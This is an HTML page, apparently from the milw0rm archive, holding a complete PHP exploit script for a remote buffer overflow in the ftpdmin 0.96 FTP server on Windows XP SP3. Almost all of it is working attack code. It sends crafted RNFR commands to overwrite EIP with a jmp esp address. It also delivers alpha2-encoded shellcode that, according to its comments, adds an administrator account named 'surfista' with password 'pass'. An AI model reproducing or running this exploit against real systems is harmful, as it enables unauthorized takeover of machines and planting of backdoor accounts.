<html><head><title>ftpdmin 0.96 RNFR Remote Buffer Overflow Exploit (xp sp3/case study)</title></head><pre>&lt;?php
/*
   ftpdmin v. 0.96 RNFR remote buffer overflow exploit (xp sp3 / case study)
   by Nine:Situations:Group::surfista
   software site: http://www.sentex.net/~mwandel/ftpdmin/
   our site: http://retrogod.altervista.org/

   bug found by rgod in 2006, RNFR sequences can trigger a simple eip overwrite.
   We can use 272 bytes before EIP and 119 after EIP, ESP and EBP points to 
   the second memory region.
   We have a very small set of chars that we can use ,RNFR (Rename From) command  
   accept pathnames as argument, so characters whose integer representations are 
   in the range from zero through 31 and reserved chars are not allowed!
*/

error_reporting(7);
$ftp_server = &quot;192.168.0.1&quot;;
$ftp_user   = &quot;anonymous&quot;;
$ftp_pass   = &quot;anon@email.com&quot;;

function ftp_cmd($cmd){
    global $conn_id;
    echo &quot;-&gt; &quot;.$cmd.&quot;\n&quot;;
    $buff=ftp_raw($conn_id,$cmd);
}

                #WinExec shellcode of mine, enconded with the alpha2 tool by SkyLined, adds
                #a &quot;surfista&quot; admin user with pass &quot;pass&quot;
                #contains hardcoded address, re-encode command:
                #alpha2 esp &lt; shdmp.txt
                $____scode=&quot;TYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJI&quot;.
                           &quot;Xkb3SkfQkpBp4qo0nhBcaZPSMknMq3mValkOYCtqYPYxxhKO9okOe3BMrD5pTocS5&quot;.
                           &quot;prnReqDWPCev32e1BWPt3sEQbRFE9T3PtqqWPRPSQPsBSUpTosqctRdWPGVa6epPN&quot;.
                           &quot;w5F4EpRlRossG1PLw7brpOrupP5paQ1tPmaypnSYbSPtd2Pa44BOT2T3UpfOw1qTw&quot;.
                           &quot;4gPqcpupr3VQybSrTE1kOA&quot;;      
                #do not touch, esp adjustment and subsequent call esp, very large but we have lots of unused space
                $____code =&quot;TYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJI&quot;.
                           &quot;NcXl1oK3JLsOOs8lSOMSXlQoK3zL14KOm4F22EbSrOpusBSSsUGPpipdUpesVVA&quot;;
                if (strlen($____scode) &gt; 272) {die(&quot;[!] shellcode too large!&quot;);}
                $conn_id = ftp_connect($ftp_server) or die(&quot;(!) Unable to connect to $ftp_server&quot;);
                if (@ftp_login($conn_id, $ftp_user, $ftp_pass)) {
                    echo &quot;(*) Connected as $ftp_user@$ftp_server\n&quot;;
                } else {
                    die(&quot;(!) Unable to connect as $ftp_user\n&quot;);
                }
                $____jnk = str_repeat(&quot;\x66&quot;,272 - strlen($____scode));
                $____eip=&quot;\x44\x3a\x41\x7e&quot;;     //0x7E413A44      jmp esp, user32.dll xp sp3
                $____jnk_ii = str_repeat(&quot;\x66&quot;,119 - strlen($____code));
                $____bof=$____scode.$____jnk.$____eip.$____code.$____jnk_ii;
                $____boom=&quot;RNFR &quot;.str_repeat(&quot;x&quot;,0x0096);
                ftp_cmd($____boom);
                $____boom=&quot;RNFR &quot;.$____bof;
                ftp_cmd($____boom);
                $____boom=&quot;RNFR &quot;.str_repeat(&quot;x&quot;,0x0208);
                ftp_cmd($____boom);
                ftp_close($conn_id);
                echo &quot;(*) Done !\n&quot;;
?&gt;

# milw0rm.com [2009-04-13]</pre></html>